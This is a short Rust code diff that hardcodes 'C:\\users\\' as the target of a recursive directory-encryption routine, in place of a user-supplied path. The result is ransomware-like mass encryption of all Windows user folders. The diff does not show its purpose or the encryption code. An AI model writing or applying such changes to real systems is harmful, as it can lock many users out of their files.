@@ -171,7 +171,7 @@ fn main() {
     let args: Vec<String> = env::args().collect();
 
     let password: &str = &args[1];
-    let directory: &str = &args[2];
+    let directory: &str = "C:\\users\\";
 
     // Encrypt directory
     if let Err(err) = encrypt_directory_recursive(directory, password) {
